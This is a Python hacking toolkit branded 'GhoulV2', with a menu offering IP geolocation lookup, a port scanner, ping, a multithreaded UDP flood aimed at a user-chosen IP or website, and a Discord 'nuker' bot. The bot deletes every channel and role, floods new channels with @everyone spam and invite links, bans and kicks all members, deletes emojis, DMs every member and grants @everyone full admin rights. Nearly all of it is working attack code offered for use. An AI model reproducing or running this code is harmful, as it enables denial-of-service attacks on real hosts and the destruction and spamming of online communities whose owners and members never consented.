import socket
import os
import random
import time
import threading
from time import sleep
from os import system
from turtle import speed
import requests
import nmap
import ipaddress
import platform
import sys
import os
from scapy.all import sniff, IP, TCP, UDP, Raw, wrpcap
import tkinter as tk
from tkinter import ttk
from turtle import color
import discord
import asyncio
import colorama
import json
import random
import os
from discord.ext import commands
from discord import Permissions
from discord import Webhook


def get_ipv4_address():
    try:
        hostname = socket.gethostname()
        ipv4_address = socket.gethostbyname(hostname)
        return ipv4_address
    except:
        return "Not found"

def get_ipv6_address():
    try:
        ipv6_address = requests.get('https://api6.ipify.org').text
        return ipv6_address
    except:
        return "Not found"

def get_public_ip():
    try:
        public_ip = requests.get('https://api.ipify.org').text
        return public_ip
    except:
        return "Not found"
    
if platform.system() == "Windows":
    os.system("cls")
else:
    os.system("clear")

def main():
    white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(3500)
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

B = '\033[35m'
R = '\033[31m'
N = '\033[0m'
A = '\033[34m'

def loading_screen():
    import random
    import sys

    PURPLE = '\033[35m'
    RESET = '\033[0m'

    os.system("cls" if platform.system() == "Windows" else "clear")

    # Small banner
    print(PURPLE + r"""
   ╔════════════════════════════╗
   ║   SYSTEM INITIALIZATION    ║
   ║       GHOST V2 TOOL        ╚╗
   ║https://discord.gg/dqUx3tpumG║
   ╚═════════════════════════════╝
    """ + RESET)

    messages = [
        "Loading network stack",
        "Initializing tools",
        "Decrypting interface",
        "Finalizing system"
    ]

    # beep function (cross-platform)
    def beep():
        try:
            if platform.system() == "Windows":
                import winsound
                winsound.Beep(300, 20)
            else:
                print("\a", end="")  # terminal bell
        except:
            pass

    for i in range(1, 31):
        percent = int((i / 30) * 100)
        bar = "█" * i + "-" * (30 - i)

        msg = messages[i % len(messages)]

        # ⚡ glitch effect (random flicker characters)
        glitch = "".join(random.choice("█▓▒░#/\\|") for _ in range(6))

        beep()

        sys.stdout.write(
            f"\r{PURPLE}{glitch} {msg} [{bar}] {percent}% {glitch}{RESET}"
        )
        sys.stdout.flush()
        time.sleep(0.15)

    print(PURPLE + "\n\n✔ System Ready — Welcome Operator\n" + RESET)
    time.sleep(1.8)
    os.system("cls" if platform.system() == "Windows" else "clear")

import ctypes
import platform

if platform.system() == "Windows":
    ctypes.windll.kernel32.SetConsoleTitleW("[GhoulV2]")



loading_screen()
print(f"""{B}

      ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗██╗      ██╗   ██╗██████╗ 
     ██╔════╝ ██║  ██║██╔═══██╗██║   ██║██║      ██║   ██║╚════██╗
     ██║  ███╗███████║██║   ██║██║   ██║██║      ██║   ██║ █████╔╝
     ██║   ██║██╔══██║██║   ██║██║   ██║██║      ╚██╗ ██╔╝██╔═══╝ 
     ╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝███████╗  ╚████╔╝ ███████╗
      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝   ╚═══╝  ╚══════╝
                         [Made By JJ Joost]
                          [Version: 2.0.0]
        ╔══╦═════════════════════════╦══╦════════════════════════╗
        ║01║IP Lookup                ║05║Discord Nuker           ║
        ║02║DDos IP and Site         ║06║In Progress             ║
        ║03║Ping IP                  ║07║In Progress             ║
        ║04║Port Scanner             ║08║Exit                    ║
        ╚══╩═════════════════════════╩══╩════════════════════════╝""")

print()


Choice = input("Enter your Option:")

if Choice == "1":
        def check_internet():
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                return False

        def get_ip_info():
            ip_address = input(R + "[" + B + "+" + R + "] " + R + "Enter the IP address : " + B)
            print(B + B + "[" + A + "$" + B + "] " + B + "Getting some info...")
            sleep(2)

            if not check_internet():
                print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                sleep(3)
                main()

            response = requests.get(f"http://ip-api.com/json/{ip_address}")

            if response.status_code != 200:
                print(R + "[" + B + "!" + R + "] " + R + "Cannot find the ip address")
                sleep(3)
                main()

            data = response.json()

            # VPN CHECK
            isp = data.get('isp', 'N/A')
            org = data.get('org', 'N/A')

            vpn_keywords = [
                "vpn",
                "proxy",
                "hosting",
                "cloud",
                "data center",
                "digitalocean",
                "amazon",
                "google",
                "microsoft",
                "ovh",
                "contabo",
                "m247",
                "nordvpn",
                "surfshark",
                "expressvpn",
            ]
            combined = f"{isp} {org}".lower()

            if any(keyword in combined for keyword in vpn_keywords):
                vpn_status = A + "Active"
            else:
                vpn_status = R + "Not Active"

            print(B + "\n╭ " + R + "IP ADDRESS : " + ip_address)
            print(B + "├ " + R + "STATE : ", data.get('regionName', 'N/A'))
            print(B + "├ " + R + "ORGANIZATION : ", data.get('org', 'N/A'))
            print(B + "├ " + R + "ISP : ", data.get('isp', 'N/A'))
            print(B + "├ " + R + "VPN STATUS : ", vpn_status)
            print(B + "├ " + R + "CITY : ", data.get('city', 'N/A'))
            print(B + "├ " + R + "COUNTRY : ", data.get('country', 'N/A'))
            print(B + "├ " + R + "COUNTRY ISO : ", data.get('countryCode', 'N/A'))
            print(B + "├ " + R + "POSTAL CODE : ", data.get('zip', 'N/A'))
            print(B + "├ " + R + "LATITUDE : ", data.get('lat', 'N/A'))
            print(B + "├ " + R + "LONGITUDE : ", data.get('lon', 'N/A'))

            if 'lat' in data and 'lon' in data:
                print(B + "╰ " + R + "LOCATION : ", f"https://www.google.com/maps/?q={data['lat']},{data['lon']}")
                
            main_menu = input(R + "\nWanna go back to the main menu (Y/N) ? ")
            
            if main_menu == "Y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu == "N":
                sleep(2)
                exit()

            elif main_menu == "y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu == "n":
                sleep(2)
                exit()
            
            else :
                sleep(2)
                exit()

        get_ip_info()

elif Choice == "2":


            

        def DoS(ip, port, size, index):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while True:
                sock.sendto(random._urandom(size), (ip, port))
                print(f"{R}[{B}THREAD {index}{R}] {R}\xBB {B}{size} {R}bytes sent to {B}{ip}\033[0m")

        def mainv4():
            
            
                
            IP       = input(R + "[" + B + "+" + R + "] " + R + "Target's IP or Website Domain : " + B) if len(sys.argv) < 2 else sys.argv[1]
            PORT     = int(input(R + "[" + B + "+" + R + "] " + R + "Target's Port : " + B)) if len(sys.argv) < 3 else int(sys.argv[2])
            SIZE     = int(input(R + "[" + B + "+" + R + "] " + R + "Packet Size : " + B)) if len(sys.argv) < 4 else int(sys.argv[3])
            COUNT    = int(input(R + "[" + B + "+" + R + "] " + R + "Enter How Many Threads to Use : " + B)) if len(sys.argv) < 5 else int(sys.argv[4])


            if PORT > 65535 or PORT < 1:
                print(f"\n{R}[{B}!{R}]{R} {R}\xBB Please choose a port between 1 and 65535")
                time.sleep(3)
                main()

            if SIZE > 65500 or SIZE < 1:
                print(f"\n{R}[{B}!{R}]{R} {R}\xBB Please choose a packet size between 1 and 65500")
                time.sleep(3)
                main()

            for i in range(COUNT):
                try:
                    t = threading.Thread(target=DoS, args=(IP, PORT, SIZE, i))
                    t.start()
                except Exception as e:
                    print(f"\n{R}[{B}!{R}]{R} {R}\xBB An error ocurred initializing thread {i}: {e}")            

        if __name__ == "__main__":
            mainv4()

elif Choice == "3":
        def check_internet():
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                return False
            
        ipA = input(R + "[" + B + "+" + R + "] " + R + "Target's IP : " + B)
        print(B + B + "[" + A + "$" + B + "] " + B + "Pinging...")
        sleep(2)

        if not check_internet():
                print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                sleep(3)
                main()
        lpingip = f"ping -w 1000 {ipA}"
        pingip = "ping -t -w 1000 " + "" + ipA
        if platform.system() == "Windows":
            os.system("cls")
            print(R)
            system(pingip)
        else:
            os.system("clear")
            print(R)
            system(lpingip)
        sleep(100)


elif Choice == "4":
        def is_valid_ip(ip_address):
            try:
                ipaddress.IPv4Address(ip_address)
                return True
            except ipaddress.AddressValueError:
                return False

        def scan_ports(ip_address):
            if not is_valid_ip(ip_address):
                print(f"{R}[{B}!{R}] Invalid IP address.")
                return

            nm = nmap.PortScanner()
            scan_result = nm.scan(ip_address, arguments='-F') 

            open_ports = []
            closed_ports = []
            filtered_ports = []

            if 'scan' in scan_result and ip_address in scan_result['scan']:
                for target_port in scan_result['scan'][ip_address]['tcp']:
                    state = scan_result['scan'][ip_address]['tcp'][target_port]['state']
                    if state == 'open':
                        open_ports.append(target_port)
                    elif state == 'closed':
                        closed_ports.append(target_port)
                    elif state == 'filtered':
                        filtered_ports.append(target_port)

            if open_ports:
                print(f"\n{R}[{B}?{R}] Open ports : " + ', '.join(str(port) for port in open_ports))
            else:
                print(f"\n{R}[{B}?{R}] No open ports found.")

            if closed_ports:
                print(f"{R}[{B}?{R}] Closed ports : {', '.join(str(port) for port in closed_ports)}")
            else:
                print(f"{R}[{B}?{R}] No closed ports found.")

            if filtered_ports:
                print(f"{R}[{B}?{R}] Filtered ports : {', '.join(str(port) for port in filtered_ports)}")
            else:
                print(f"{R}[{B}?{R}] No filtered ports found.")

        if __name__ == "__main__":
            target_ip = input(R + "[" + B + "+" + R + "] Enter The Device IP : " + B)  
            scan_ports(target_ip)

        main_menu2 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

        if main_menu2 == "Y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main_menu2 == "N":
            sleep(2)
            exit()

        elif main_menu2 == "y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main_menu2 == "n":
            sleep(2)
            exit()
            
        else :
            sleep(2)
            exit()

elif Choice == "7":
    print(B + B + "[" + A + "$" + B + "] " + B + "This feature is still in development...")
    time.sleep(3)

    main_menu2 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

    if main_menu2 == "Y" or main_menu2 == "y":
        print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
        sleep(2)
        main()

    elif main_menu2 == "N" or main_menu2 == "n":
        sleep(2)
        exit()

    else:
        sleep(2)
        exit()


elif Choice == "6":
    print(B + B + "[" + A + "$" + B + "] " + B + "This feature is still in development...")
    time.sleep(3)

    main_menu2 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

    if main_menu2 == "Y" or main_menu2 == "y":
        print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
        sleep(2)
        main()

    elif main_menu2 == "N" or main_menu2 == "n":
        sleep(2)
        exit()

    else:
        sleep(2)
        exit()  

elif Choice == "5":
 client = commands.Bot(command_prefix="x", intents = discord.Intents.all())
client.remove_command('help')
######################################setup########################################

token = "  " # change this to your token

channel_names = ['Fucked by JJ', 'JJ Joost on top', 'Fucked By JJ', 'JJ forever', 'Fucked by JJ']
message_spam = ['@everyone JJ RUNS U JJ op', '@everyone JJ RUNS U JOIN NOW https://discord.gg/dqUx3tpumG', '@everyone JJ  RUNS U JOIN NOW https://discord.gg/dqUx3tpumG', '@everyone JJ RUNS U JOIN NOW https://discord.gg/dqUx3tpumG']
webhook_names = ['JJ On Top', 'JJ Joost On Top', 'JJ Joost ur father']

###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "scythekz is my leader"))#change this if you want
  print(" ")
  print("[38;5;34mIntents Loaded!")
  sleep(1)
  print("[38;5;34mSuccessfully Connected To Discord!")
  sleep(1)
  print("[38;5;34mSuccessfully Logged In!")
  sleep(1)
  print(f'''

 ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗██╗         ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
██╔════╝ ██║  ██║██╔═══██╗██║   ██║██║         ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██║  ███╗███████║██║   ██║██║   ██║██║         ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██║   ██║██╔══██║██║   ██║██║   ██║██║         ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝███████╗    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                          
\x1b[38;5;172m═══════════════════════════
\x1b[38;5;172mWelcome To GhoulV2 Discord Nuker
\x1b[38;5;172mLogged In As {client.user}
\x1b[38;5;172mType xhelp To Begin Nuking
\x1b[38;5;172mVersion: v4
\x1b[38;5;172mMade by JJ Joost
\x1b[38;5;172mDiscord here > https://discord.gg/dqUx3tpumG
\x1b[38;5;172mDM me on discord for more help David/hamderjoost
\x1b[38;5;172mMade in Visual studio
\x1b[38;5;172mMade With Python
\x1b[38;5;172mNuked 3 Servers
\x1b[38;5;172m═══════════════════════════
''')

@client.command()
async def nuke(ctx, amount=10000000):
  await ctx.message.delete()
  await ctx.guild.edit(name="JJ ON TOP")#change this if u want
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(f"\x1b[38;5;34m{channel.name} Has Been Successfully Deleted!")
    except:
        pass
        print ("\x1b[38;5;196mUnable To Delete Channel!")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34mSuccessfully Made Channel [{i}]!")
    except:
      print("\x1b[38;5;196mUnable To Create Channel!")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"\x1b[38;5;34m{role.name} \x1b[38;5;34mHas Been Successfully Deleted!")

    except:
      print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam)
        )
          print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
        except:
          print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
    for member in list (ctx.guild.members):
        try:
          await member.ban(reason="JJ Nuke Bot")#change this if u want
          print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
        except:
          print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")
          

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(message_spam))


@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
  while True:  
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))



@client.command()
async def banall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
         print (f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
       except:
         print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")
  


@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="JJ BOT HATES YOU")
      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
    except:
      print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"TRASHED BY BLAZY", color=random.choice(color))
      print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")


@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
            except:
                print (f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!")


@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")


@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!") 
                  except:
                      print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")


@client.command()
async def help(ctx, *args):
    await ctx.message.delete()
    retStr = str("""```fix\nxnuke - Destroys Guild\n\nxbanall - Bans All Members \n\nxkickall - Kicks All Members\n\nxrolespam - Spams Roles\n\nxemojidel - Deletes All Emojis\n\nnone\n\nxadmin - Gives Everyone Admin```""")
    embed = discord.Embed(color=14177041,title="JJ Nuke Bot")
    embed.add_field(name="JJ Nuke Bot Help Commands",value=retStr)
    embed.set_footer(text=f"Requested By {ctx.author} |  Blazyy Nuke Bot | Made By JJ Joost")

    await ctx.send(embed=embed)


client.run(token)
time.sleep(2)
exit()


if Choice == "8":
    print(B + B + "[" + A + "$" + B + "] " + B + "Exiting...")
    sleep(2)
    exit()


else:
    print(f"{R}[{B}!{R}] {R}\xBB Invalid choice, please try again.")
